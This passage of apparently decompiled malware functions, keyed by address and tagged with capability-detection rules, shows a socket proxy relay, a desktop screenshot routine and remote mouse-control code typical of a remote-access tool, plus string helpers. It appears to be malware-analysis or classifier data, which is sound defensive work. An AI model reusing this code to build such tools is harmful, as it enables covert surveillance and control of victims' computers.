iStack48;\n    int32_t iStack44;\n    uint uStack36;\n    int32_t iStack28;\n    uint uStack24;\n    int32_t iStack20;\n    uint uStack16;\n    \n    iStack76 = sub.msvcrt.dll_malloc(0x1000);\n    if (iStack76 != 0) {\n        iVar1 = param_2;\n        if (param_2 < param_1) {\n            iVar1 = param_1;\n        }\n        iStack48 = iVar1 + 1;\n        do {\n            do {\n                do {\n                    uStack604 = 0xf;\n                    uStack600 = 0;\n                    uStack336 = 0;\n                    uStack16 = 0;\n                    iStack332 = param_2;\n                    uStack336 = 1;\n                    uStack16 = 0;\n                    uStack336 = 1;\n                    iStack20 = 0;\n                    while ((iStack20 == 0 && (param_2 != param_1))) {\n                        iStack20 = 1;\n                    }\n                    if (iStack20 == 1) {\n                        iStack328 = param_1;\n                        uStack336 = 2;\n                    }\n                    uStack24 = 0;\n                    iStack592 = param_2;\n                    uStack24 = 0;\n                    uStack596 = 1;\n                    iStack28 = 0;\n                    while ((iStack28 == 0 && (param_2 != param_1))) {\n                        iStack28 = 1;\n                    }\n                    if (iStack28 == 1) {\n                        iStack588 = param_1;\n                        uStack596 = 2;\n                    }\n                    puStack620 = &uStack604;\n                    puStack624 = &uStack596;\n                    iStack72 = sub.WS2_32.dll_select(iStack48, &uStack336, 0);\n                } while (iStack72 == 0);\n                if (((iStack72 < 0) || (iVar1 = sub.WS2_32.dll___WSAFDIsSet(),  iVar1 != 0)) ||\n                   (iVar1 = sub.WS2_32.dll___WSAFDIsSet(iStack20, &puStack624),  iVar1 != 0)) goto code_r0x004188fc;\n                iVar1 = sub.WS2_32.dll___WSAFDIsSet(iStack28, auStack372);\n                if (iVar1 != 0) {\n                    iStack116 = sub.WS2_32.dll_recv(uStack36, iStack120, 0x1000, 0);\n                    if (iStack116 < 1) goto code_r0x004188fc;\n                    iStack92 = 0;\n                    iStack96 = iStack116;\n                    while (iStack92 < iStack96) {\n                        aiStack136[0] = sub.WS2_32.dll_send(uStack56, aiStack136[0] + iStack92, iStack96, 0);\n                        if (aiStack136[0] == -1) {\n                            iStack140 = fcn.00407c84();\n                            if (iStack140 != 0x2733) break;\n                            fcn.0040b294();\n                        }\n                        else {\n                            iStack112 = iStack112 - aiStack136[0];\n                            iStack108 = iStack108 + aiStack136[0];\n                        }\n                    }\n                    if (iStack96 != 0) goto code_r0x004188fc;\n                }\n                iVar1 = sub.WS2_32.dll___WSAFDIsSet(uStack56, auStack396);\n            } while (iVar1 == 0);\n            iStack140 = sub.WS2_32.dll_recv();\n            if (iStack140 < 1) break;\n            uStack124 = 0;\n            iStack128 = iStack140;\n            while (iStack100 < iStack104) {\n                iStack144 = sub.WS2_32.dll_send(uStack52, aiStack136[0] + iStack100, iStack104, 0);\n                if (iStack144 == -1) {\n                    iStack148 = fcn.00407c84();\n                    if (iStack148 != 0x2733) break;\n                    fcn.0040b294();\n                }\n                else {\n                    iStack120 = iStack120 - iStack144;\n                    iStack116 = iStack116 + iStack144;\n                }\n            }\n        } while (iStack44 == 0);\ncode_r0x004188fc:\n        fcn.0040b4bf(aiStack136);\n        fcn.00408d8a(&uStack56);\n        fcn.00408d8a(&uStack52);\n    }\n    return;\n}\n",
        "token_count": 1394
    },
    "00418934": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00418934(uint param_1, uchar param_2)\n\n{\n    uint32_t uVar1;\n    uchar auStack16 [16];\n    \n    auStack16[0] = param_2;\n    uVar1 = sub.WS2_32.dll_send(param_1, auStack16, 1, 0);\n    return uVar1 & 0xffffff00 | uVar1 == 1;\n}\n",
        "token_count": 96
    },
    "00418970": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004189ba)\n// WARNING: Removing unreachable block (ram,0x004189d5)\n\nvoid fcn.00418970(int32_t *param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uStack768;\n    uchar *puStack764;\n    uint uStack752;\n    int32_t iStack748;\n    uchar *puStack744;\n    uint uStack740;\n    uint uStack736;\n    uchar *puStack732;\n    uint32_t uStack640;\n    uint32_t uStack636;\n    int32_t iStack616;\n    uchar auStack600 [20];\n    uchar auStack580 [8];\n    uint uStack572;\n    uint uStack568;\n    uint uStack564;\n    uint uStack560;\n    int32_t iStack556;\n    uchar uStack360;\n    uchar auStack359 [15];\n    uchar auStack344 [212];\n    uint uStack132;\n    int32_t iStack120;\n    uchar auStack116 [12];\n    uchar auStack104 [4];\n    ushort uStack100;\n    uchar auStack98 [2];\n    uchar auStack96 [4];\n    uchar auStack92 [8];\n    uint *puStack84;\n    int32_t iStack80;\n    uint *puStack72;\n    uint *puStack60;\n    uint uStack44;\n    uint *puStack40;\n    uint *puStack24;\n    uint *puStack16;\n    \n    uStack44 = 0xffffffff;\n    uStack572 = 0xffffffff;\n    uStack568 = 5;\n    uStack564 = 0;\n    puStack16 = NULL;\n    iStack556 = *param_1;\n    puStack16 = NULL;\n    uStack44 = 0xffffffff;\n    uStack560 = 1;\n    iStack748 = *param_1 + 1;\n    puStack732 = &stack0xfffffdc8;\n    uStack736 = 0;\n    uStack740 = 0;\n    puStack744 = &stack0xfffffdd0;\n    uStack752 = 0x418a70;\n    iVar2 = sub.WS2_32.dll_select();\n    if (0 < iVar2) {\n        uStack768 = *puStack16;\n        puStack764 = &stack0xfffffdbc;\n        iVar2 = sub.WS2_32.dll___WSAFDIsSet();\n        if (iVar2 != 0) {\n            puStack764 = NULL;\n            uStack768 = 4;\n            iVar2 = sub.WS2_32.dll_recv(*puStack24, &stack0xfffffda8);\n            if (0 < iVar2) {\n                if (iStack616 == 1) {\n                    iVar2 = sub.WS2_32.dll_recv(*puStack40, &stack0xfffffea8, 6, 0);\n                    if (iVar2 != 6) {\n                        return;\n                    }\n                    uStack100 = 2;\n                    fcn.0041a5e1(&stack0xffffff9e, &stack0xfffffe98, 2);\n                    fcn.0041a5e1(&stack0xffffffa0, &stack0xfffffe9a, 4);\n                    fcn.0041a59f(&stack0xffffffa4, 0, 8);\n                }\n                else {\n                    iStack80 = sub.WS2_32.dll_recv(*puStack40, &stack0xfffffea8, 0x100, 0);\n                    if (iStack80 < 1) {\n                        return;\n                    }\n                    uStack636 = 0;\n                    puStack84 = fcn.00419918(&stack0xfffffd04, &stack0xfffffe98, 0x80);\n                    fcn.0041a5e1(&stack0xfffffd84, puStack84 + &stack0xfffffe99, 2);\n                    uStack640 = sub.WS2_32.dll_ntohs(uStack636 & 0xffff);\n                    uStack640 = uStack640 & 0xffff;\n                    cVar1 = fcn.00407c90(&stack0xfffffd00, uStack640, &stack0xffffff98);\n                    if (cVar1 != '\\x01') {\n                        fcn.00418934(*puStack60, 1);\n                        return;\n                    }\n                }\n                iStack120 = sub.WS2_32.dll_socket(2, 1, 6);\n                if (iStack120 == -1) {\n                    fcn.00418934(*puStack72, 2);\n                }\n                else {\n                    iVar2 = sub.WS2_32.dll_connect(iStack120, &stack0xffffff8c, 0x10);\n                    if (iVar2 == -1) {\n                        fcn.00418934(*puStack84, 2);\n                        fcn.00408d8a(&stack0xffffff7c);\n                    }\n                    else {\n                        fcn.00418934(*puStack84, 3);\n                        fcn.0041838c(uStack132, *puStack84);\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1123
    },
    "00418e44": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00418e44(uint *param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t in_stack_ffffff00;\n    uint uStack232;\n    uint uStack228;\n    uchar *puStack224;\n    uint uStack220;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    int32_t iStack200;\n    uint *puStack196;\n    int32_t iStack192;\n    uint uStack188;\n    int32_t iStack184;\n    int32_t iStack180;\n    uint uStack176;\n    int32_t iStack172;\n    uint uStack168;\n    uint32_t uStack164;\n    uint uStack160;\n    int32_t iStack156;\n    ushort uStack152;\n    ushort uStack150;\n    uint uStack148;\n    int32_t iStack144;\n    int32_t *piStack140;\n    uint uStack132;\n    uint *puStack124;\n    int32_t iStack120;\n    uint32_t uStack112;\n    uint uStack104;\n    int32_t *piStack96;\n    uint uStack72;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint *puStack56;\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uint uStack40;\n    int32_t iStack36;\n    int32_t iStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack16;\n    \n    uStack112 = uStack112 & 0xffffff00 | param_2 & 0xff;\n    *param_1 = 0;\n    uStack44 = 0;\n    uStack16 = 0;\n    iStack172 = 0;\n    uStack176 = 0x418e85;\n    uStack24 = sub.USER32.dll_GetSystemMetrics();\n    uStack176 = 1;\n    iStack180 = 0x418e9b;\n    iStack32 = sub.USER32.dll_GetSystemMetrics();\n    iStack184 = 0x418eaa;\n    iStack180 = sub.USER32.dll_GetDesktopWindow();\n    if (((iStack180 == 0) || (iStack28 == 0)) || (iStack32 == 0)) {\n        uStack160 = 0;\n    }\n    else {\n        iStack184 = 0x418ee8;\n        iStack36 = iStack180;\n        iStack184 = sub.USER32.dll_GetDC();\n        uStack188 = 0x418f01;\n        uStack44 = iStack184;\n        uStack52 = sub.GDI32.dll_CreateCompatibleDC();\n        iStack180 = uStack40;\n        iStack184 = iStack36;\n        uStack188 = iStack48;\n        iStack192 = 0x418f30;\n        iStack68 = sub.GDI32.dll_CreateCompatibleBitmap();\n        if (((iStack60 != 0) && (iStack64 != 0)) && (iStack68 != 0)) {\n            iStack200 = iStack64;\n            uStack204 = 0x418f7e;\n            puStack196 = iStack68;\n            sub.GDI32.dll_SelectObject();\n            uStack176 = 0x40cc0020;\n            iStack180 = 0;\n            iStack184 = 0;\n            uStack188 = iStack68;\n            iStack192 = iStack60;\n            puStack196 = puStack56;\n            iStack200 = 0;\n            uStack204 = 0;\n            uStack208 = uStack72;\n            uStack212 = 0x418fd9;\n            iVar1 = sub.GDI32.dll_BitBlt();\n            if (iVar1 != 0) {\n                fcn.0041a59f(&stack0xffffff7e, 0, 0xe);\n                fcn.0041a59f(&stack0xffffff50, 0, 0x2c);\n                uStack176 = 0x28;\n                uStack164 = uStack164;\n                uStack220 = 0;\n                puStack224 = &stack0xffffff50;\n                uStack228 = 0;\n                uStack232 = 0;\n                iVar1 = sub.GDI32.dll_GetDIBits(uStack104, uStack112, 0);\n                if (iVar1 != 0) {\n                    uStack160 = CONCAT22(0x4d42, uStack160);\n                    iStack156 = puStack196 * ((iStack200 + 1) * 3 & 0xfffffffcU) + 0x36;\n                    uStack150 = 0;\n                    uStack152 = 0;\n                    uStack148 = 0x36;\n                    uStack188 = 0;\n                    uStack204 = 0x28;\n                    iStack200 = iStack120;\n                    puStack196 = puStack124;\n                    iStack192 = 0x180001;\n                    *piStack96 = iStack184 + 0x36;\n                    iStack144 = sub.msvcrt.dll_calloc(*piStack96, 4);\n                    if (iStack144 != 0) {\n                        in_stack_ffffff00 = iStack144 + 0x36;\n                        iVar1 = sub.GDI32.dll_GetDIBits\n                                          (uStack132, piStack140, 0, puStack196, in_stack_ffffff00, &stack0xffffff34, 0)\n                        ;\n                        if (iVar1 == 0) {\n                            fcn.0040b4bf(&stack0xffffff54);\n                            *puStack124 = 0;\n                        }\n                        else {\n                            fcn.0041a5e1(iStack172, &stack0xffffff46, 0xe);\n                            fcn.0041a5e1(iStack172 + 0xe, &stack0xffffff18, 0x28);\n                        }\n                    }\n                }\n            }\n        }\n        sub.USER32.dll_ReleaseDC(iStack156, uStack160);\n        sub.GDI32.dll_DeleteDC(iStack172);\n        sub.GDI32.dll_DeleteObject(iStack180);\n        if ((uStack188 != 0) && (0 < *piStack140)) {\n            uStack160 = fcn.00407085(uStack188, piStack140, uStack164, uStack168, in_stack_ffffff00 & 0xff, 1);\n            fcn.0040b4bf(&stack0xffffff44);\n        }\n    }\n    return uStack160;\n}\n",
        "token_count": 1443
    },
    "0041929e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0041929e(uint param_1, uchar param_2)\n\n{\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    iStack24 = 0;\n    iStack16 = fcn.00418e44(&iStack24, param_2);\n    if ((iStack16 == 0) || (iStack24 < 1)) {\n        fcn.00408b8f(param_1, 0xcb, 0, 0);\n    }\n    else {\n        iStack20 = sub.msvcrt.dll_malloc(0x230);\n        if (iStack20 != 0) {\n            *(iStack20 + 0x208) = 0;\n            *(iStack20 + 0x20c) = 0xc9;\n            *(iStack20 + 0x20d) = 0xca;\n            *(iStack20 + 0x20e) = 0xcb;\n            *(iStack20 + 0x204) = iStack16;\n            *(iStack20 + 0x218) = iStack24;\n            *(iStack20 + 0x21c) = iStack24 >> 0x1f;\n            *(iStack20 + 0x220) = 0;\n            *(iStack20 + 0x224) = 0;\n            *(iStack20 + 0x210) = param_1;\n            fcn.0040b2ab(0x41c150, iStack20);\n        }\n    }\n    return;\n}\n",
        "token_count": 345
    },
    "00419415": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00419415(uint param_1)\n\n{\n    char unaff_retaddr;\n    \n    sub.USER32.dll_SetCursorPos(param_1, param_1._2_2_);\n    if (unaff_retaddr == '\\x02') {\n        sub.USER32.dll_mouse_event(0x20, 0, 0, 0, 0);\n    }\n    else if (unaff_retaddr == '\\x03') {\n        sub.USER32.dll_mouse_event(8, 0, 0, 0, 0);\n    }\n    else if (unaff_retaddr == '\\x01') {\n        sub.USER32.dll_mouse_event(2, 0, 0, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 161
    },
    "004194ea": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004194ea(uint param_1, char param_2)\n\n{\n    if (param_2 == '\\x02') {\n        sub.USER32.dll_mouse_event(0x40, 0, 0, 0, 0);\n    }\n    else if (param_2 == '\\x03') {\n        sub.USER32.dll_mouse_event(0x10, 0, 0, 0, 0);\n    }\n    else if (param_2 == '\\x01') {\n        sub.USER32.dll_mouse_event(4, 0, 0, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "0041972e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0041972e(int32_t *param_1, int32_t param_2, uint32_t param_3)\n\n{\n    char cVar1;\n    \n    if ((param_2 != 0) && (param_3 != 0)) {\n        if ((param_1[1] - param_1[2] < param_3) &&\n           (cVar1 = fcn.004196c2(param_1, param_3 + param_1[1]),  cVar1 != '\\x01')) {\n            return 0;\n        }\n        fcn.0041a5e1(*param_1 + param_1[2], param_2, param_3);\n        param_1[2] = param_1[2] + param_3;\n    }\n    return 1;\n}\n",
        "token_count": 181
    },
    "00419918": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar * fcn.00419918(char *param_1, char *param_2, int32_t param_3)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char cVar3;\n    int32_t iStack12;\n    char *pcStack8;\n    char *pcStack4;\n    \n    pcStack4 = param_1;\n    pcStack8 = param_2;\n    iStack12 = param_3;\n    if (param_3 != 0) {\n        do {\n            iStack12 = iStack12 + -1;\n            if (iStack12 == 0) break;\n            pcVar2 = pcStack4 + 1;\n            pcVar1 = pcStack8 + 1;\n            *pcStack4 = *pcStack8;\n            cVar3 = *pcStack4;\n            pcStack8 = pcVar1;\n            pcStack4 = pcVar2;\n        } while (cVar3 != '\\0');\n    }\n    if (iStack12 == 0) {\n        if (param_3 != 0) {\n            *pcStack4 = '\\0';\n        }\n        do {\n            pcVar2 = pcStack8 + 1;\n            cVar3 = *pcStack8;\n            pcStack8 = pcVar2;\n        } while (cVar3 != '\\0');\n    }\n    return pcStack8 + (-1 - param_2);\n}\n",
        "token_count": 307
    },
    "004199a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.004199a8(char *param_1, char *param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack24;\n    char *pcStack20;\n    char *pcStack16;\n    \n    pcStack20 = param_2;\n    iStack24 = param_3;\n    for (pcStack16 = param_1; (iStack24 != 0 && (*pcStack16 != '\\0')); pcStack16 = pcStack16 + 1) {\n        iStack24 = iStack24 + -1;\n    }\n    iVar2 = pcStack16 - param_1;\n    iStack24 = param_3 - iVar2;\n    if (iStack24 == 0) {\n        iVar1 = sub.msvcrt.dll_strlen(param_2);\n    }\n    else {\n        for (; *pcStack20 != '\\0'; pcStack20 = pcStack20 + 1) {\n            if (iStack24 != 1) {\n                *pcStack16 = *pcStack20;\n                iStack24 = iStack24 + -1;\n                pcStack16 = pcStack16 + 1;\n            }\n        }\n        *pcStack16 = '\\0';\n        iVar1 = pcStack20 - param_2;\n    }\n    return iVar1 + iVar2;\n}\n",
        "token_count": 298
    },
    "00419a6a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.00419a6a(int32_t param_1, char param_2, int32_t param_3, int32_t param_4, uint32_t param_5)\n\n{\n    uint32_t uStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    if (param_1 == 0) {\n        uStack28 = 0xffffffff;\n    }\n    else {\n        iStack20 = 0;\n        fcn.0041a59f(param_4, 0, param_5);\n        iStack24 = fcn.0041a4de(param_2, param_1);\n        for (iStack16 = 0; iStack16 < param_3 + -1; iStack16 = iStack16 + 1) {\n            if (iStack24 == -1) {\n                return 0xffffffff;\n            }\n            iStack20 = iStack20 + iStack24;\n            iStack24 = fcn.0041a4de(param_2, iStack20 + param_1);\n        }\n        iStack16 = iStack20;\n        for (uStack28 = 0; (iStack16 < iStack20 + iStack24 + -1 && (uStack28 < param_5)); uStack28 = uStack28 + 1) {\n            *(param_4 + uStack28) = *(param_1 + iStack16);\n            iStack16 = iStack16 + 1;\n        }\n        *(uStack28 + param_4) = 0;\n    }\n    return uStack28;\n}\n",
        "token_count": 358
    },
    "00419b7e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00419b7e(int32_t param_1, char *param_2, int32_t param_3)\n\n{\n    int32_t iStack4;\n    \n    if (param_3 != 0) {\n        for (; *(param_3 + param_1) != '\\0'; param_1 = param_1 + 1) {\n            if (*(param_3 + param_1) == *param_2) {\n                for (iStack4 = 1;\n                    ((param_2[iStack4] != '\\0' && (*(param_3 + iStack4 + param_1) != '\\0')) &&\n                    (*(param_3 + iStack4 + param_1) == param_2[iStack4])); iStack4 = iStack4 + 1) {\n                }\n                if (param_2[iStack4] == '\\0') {\n                    return param_1;\n                }\n                if (*(param_3 + iStack4 + param_1) == '\\0') {\n                    return -1;\n                }\n            }\n        }\n    }\n    return -1;\n}\n",
        "token_count": 239
    },
    "00419d08": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00419d08(char *param_1)\n\n{\n    int32_t iStack12;\n    int32_t iStack8;\n    int32_t iStack4;\n    \n    if (param_1 == NULL) {\n        iStack8 = 0;\n    }\n    else {\n        iStack4 = 0;\n        iStack8 = 0;\n        iStack12 = 1;\n        if (*param_1 == '-') {\n            iStack12 = -1;\n            iStack4 = 1;\n        }\n        for (; (((param_1[iStack4] != '\\0' && (iStack4 < 0xb)) && ('/' < param_1[iStack4])) && (param_1[iStack4] < ':'))\n            ; iStack4 = iStack4 + 1) {\n            iStack8 = param_1[iStack4] + iStack8 * 10 + -0x30;\n        }\n        iStack8 = iStack8 * iStack12;\n    }\n    return iStack8;\n}\n",
        "token_count": 228
    },
    "00419dc2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.00419dc2(char *param_1)\n\n{\n    uint64_t uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uStack20;\n    int32_t iStack16;\n    uint32_t uStack12;\n    int32_t iStack8;\n    \n    if (param_1 == NULL) {\n        uVar2 = 0;\n        iVar6 = 0;\n    }\n    else {\n        iStack8 = 0;\n        uStack12 = 1;\n        uStack20 = 0;\n        iStack16 = 0;\n        if (*param_1 == '-') {\n            uStack12 = 0xffffffff;\n            iStack8 = 1;\n        }\n        for (; (((param_1[iStack8] != '\\0' && (iStack8 < 0x15)) && ('/' < param_1[iStack8])) && (param_1[iStack8] < ':')\n               ); iStack8 = iStack8 + 1) {\n            uVar1 = uStack20;\n            uVar3 = uVar1 * 10;\n            uVar5 = param_1[iStack8];\n            uVar4 = uVar3 + uVar5;\n            uStack20 = uVar4 - 0x30;\n            iStack16 = iStack16 * 10 + (uVar1 * 10 >> 0x20) + (uVar5 >> 0x1f) + CARRY4(uVar3, uVar5) + -1 +\n                       (0x2f < uVar4);\n        }\n        uVar2 = uStack12 * uStack20;\n        iVar6 = iStack16 * uStack12 + uStack20 * (uStack12 >> 0x1f) + (uStack12 * uStack20 >> 0x20);\n    }\n    return CONCAT44(iVar6, uVar2);\n}\n",
        "token_count": 443
    },
    "00419f10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00419f10(int32_t *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = sub.msvcrt.dll__vscprintf(param_2, &stack0x0000000c);\n    if (iVar1 < 1) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        iVar3 = sub.msvcrt.dll_calloc(iVar1 + 1, 1);\n        *param_1 = iVar3;\n        if (*param_1 == 0) {\n            uVar2 = 0xffffffff;\n        }\n        else {\n            uVar2 = sub.msvcrt.dll__vsnprintf(*param_1, iVar1 + 1, param_2, &stack0x0000000c);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 198
    },
    "00419fa8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.00419fa8(int32_t param_1, uint32_t param_2, uint param_3)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = sub.msvcrt.dll__vsnprintf(param_1, param_2, param_3, &stack0x00000010);\n    if (uVar1 < 1) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        if (uVar1 < param_2) {\n            *(param_1 + uVar1) = 0;\n        }\n        if (uVar1 == param_2) {\n            *(param_1 + (uVar1 - 1)) = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 168
    },
    "0041a022": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0041a022(int32_t *param_1, int32_t param_2, int32_t *param_3, int32_t param_4, char param_5)\n\n{\n    int32_t iVar1;\n    \n    if ((*param_1 != 0) && (param_2 == -1)) {\n        param_2 = sub.msvcrt.dll_strlen(*param_1);\n    }\n    if ((*param_3 != 0) && (param_4 == -1)) {\n        param_4 = sub.msvcrt.dll_strlen(*param_3);\n    }\n    if (((param_1 == NULL) && (param_3 == NULL)) || (param_4 + param_2 < 0)) {\n        iVar1 = 0;\n    }\n    else if (param_2 < 1) {\n        if ((param_5 != '\\0') && (*param_1 != 0)) {\n            fcn.0040b4bf(param_1);\n        }\n        iVar1 = *param_3;\n    }\n    else if (param_4 < 1) {\n        if ((param_5 != '\\0') && (*param_3 != 0)) {\n            fcn.0040b4bf(param_3);\n        }\n        iVar1 = *param_1;\n    }\n    else {\n        iVar1 = sub.msvcrt.dll_realloc(*param_1, param_4 + param_2 + 2);\n        if (iVar1 == 0) {\n            iVar1 = 0;\n        }\n        else {\n            fcn.0041a5e1(iVar1 + param_2, *param_3, param_4);\n            *(iVar1 + param_4 + param_2) = 0;\n            if (param_5 != '\\0') {\n                fcn.0040b4bf(param_3);\n                *param_1 = 0;\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 428
    },
    "0041a1d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0041a1d8(char *param_1, char *param_2)\n\n{\n    char cVar1;\n    char cVar2;\n    char *pcStack20;\n    char *pcStack16;\n    \n    if ((param_1 != NULL) && (param_2 != NULL)) {\n        pcStack16 = param_1;\n        pcStack20 = param_2;\n        do {\n            if ((*pcStack16 == '\\0') || (*pcStack20 == '\\0')) {\n                if (*pcStack16 == *pcStack20) {\n                    return 0;\n                }\n                return 0xffffffff;\n            }\n            cVar1 = fcn.0041a431(*pcStack16);\n            cVar2 = fcn.0041a431(*pcStack20);\n            pcStack20 = pcStack20 + 1;\n            pcStack16 = pcStack16 + 1;\n        } while (cVar1 == cVar2);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 217
    },
    "0041a27e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool fcn.0041a27e(char *param_1, char *param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    char cVar3;\n    char *pcStack24;\n    char *pcStack20;\n    \n    if ((param_1 == NULL) || (param_2 == NULL)) {\n        return false;\n    }\n    bVar1 = false;\ncode_r0x0041a29f:\n    do {\n        pcStack20 = param_2;\n        pcStack24 = param_1;\n        while( true ) {\n            if (*pcStack20 == '\\0') {\n                for (; *pcStack24 == '*'; pcStack24 = pcStack24 + 1) {\n                }\n                return *pcStack24 == '\\0';\n            }\n            if (*pcStack24 == '*') break;\n            if (*pcStack24 == '?') {\n                if (*pcStack20 == '.') goto code_r0x0041a379;\n            }\n            else {\n                cVar2 = fcn.0041a431(*pcStack20);\n                cVar3 = fcn.0041a431(*pcStack24);\n                if (cVar2 != cVar3) goto code_r0x0041a379;\n            }\n            pcStack20 = pcStack20 + 1;\n            pcStack24 = pcStack24 + 1;\n        }\n        bVar1 = true;\n        param_2 = pcStack20;\n        param_1 = pcStack24;\n        do {\n            param_1 = param_1 + 1;\n        } while (*param_1 == '*');\n        if (*param_1 == '\\0') {\n            return true;\n        }\n    } while( true );\ncode_r0x0041a379:\n    if 